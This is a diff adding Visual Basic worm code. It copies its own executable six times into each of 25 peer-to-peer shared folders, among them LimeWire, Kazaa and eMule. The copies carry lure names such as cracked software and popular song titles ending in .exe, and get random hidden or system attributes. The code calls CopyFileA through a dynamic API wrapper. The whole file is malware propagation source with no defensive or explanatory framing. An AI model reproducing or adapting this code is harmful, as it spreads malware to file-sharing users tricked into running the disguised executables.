@@ -1,0 +1,68 @@
+Function P2PSPREAD()
+On Error Resume Next
+Dim wfile As String
+wfile = App.EXEName & ".exe"
+
+  Dim X As Integer
+  Dim paths(1 To 25) As String   'P2P Folder Paths
+  paths(1) = "\Media\My Shared Folder\"
+  paths(2) = "\Program Files\LimeWire\Shared\"
+  paths(3) = "\Program Files\eDonkey2000\incoming\"
+  paths(4) = "\Program Files\eMule\Incoming\"
+  paths(5) = "\Program Files\Morpheus\My Shared Folder\"
+  paths(6) = "\Program Files\Bearshare\Shared\"
+  paths(7) = "\Program Files\Kazaa\My Shared Folder\"
+  paths(8) = "\Program Files\Kazaa Lite\My Shared Folder\"
+  paths(9) = "\Program Files\Kazaa Lite K++\My Shared Folder\"
+  paths(10) = "\Program Files\Grokster\My Grokster\"
+  paths(11) = "\Program Files\Tesla\Files\"
+  paths(12) = "\Program Files\WinMX\Shared\"
+  paths(13) = "\Program Files\Swaptor\Download\"
+  paths(14) = "\Program Files\Overnet\incoming\"
+  paths(15) = "\Program Files\appleJuice\incoming\"
+  paths(16) = "\Program Files\ICQ\shared files\"
+  paths(17) = "\Program Files\Shareaza\Downloads\"
+  paths(18) = "\Program Files\Gnucleus\Downloads\"
+  paths(19) = "\Program Files\Rapigator\Share\"
+  paths(20) = "\Program Files\XoloX\Downloads\"
+  paths(21) = "\Program Files\KMD\My Shared Folder\"
+  paths(22) = "\Program Files\Ares\My Shared Folder\"
+  paths(23) = "\Program Files\Blubster\My Shared Folder\"
+  paths(24) = "\Program Files\iMesh\iMesh5\Data\Playlists\"
+  paths(25) = "\Program Files\Warez P2P Client\My Shared Folder\"
+
+  For X = 1 To UBound(paths) Step 1  'Drops file 6 times in every path()
+    CopywFile wfile, paths(X) & CreateString
+    CopywFile wfile, paths(X) & CreateString
+    CopywFile wfile, paths(X) & CreateString
+    CopywFile wfile, paths(X) & CreateString
+    CopywFile wfile, paths(X) & CreateString
+    CopywFile wfile, paths(X) & CreateString
+  Next X
+End Function
+Function CopywFile(ByVal Source As String, ByVal Target As String)
+    Dim RanAttr(2) As Integer
+    Dim RandomAttr As Integer   'Random Attributes + dynamically called the copyfile api
+    RanAttr(0) = vbNormal
+    RanAttr(1) = vbHidden
+    RanAttr(2) = vbSystem
+    RandomAttr = RandomNumber(0, 2)
+    CallAPI "kernel32", "CopyFileA", Source, Target, 0
+    SetAttr Target, RanAttr(RandomAttr)
+End Function
+Function RandomNumber(ByVal min, ByVal max)
+    Randomize
+    RandomNumber = Int(min + (max - min + 1) * Rnd)
+End Function
+Function CreateString()
+    Dim RanType(5) As String
+    Dim RandomType As Integer  'Random file names to be dropped
+    RanType(0) = "UpdateService"
+    RanType(1) = "Kayne West - Flashing Lights.mp3"
+    RanType(2) = "WinDVD 9"
+    RanType(3) = "Ludacris - P-Poppin.mp3"
+    RanType(4) = "iTunes Cracked"
+    RanType(5) = "Windows Vista Crack"
+    RandomType = RandomNumber(0, 5)
+    CreateString = FakeFileName & RanType(RandomType) & ".exe"
+End Function
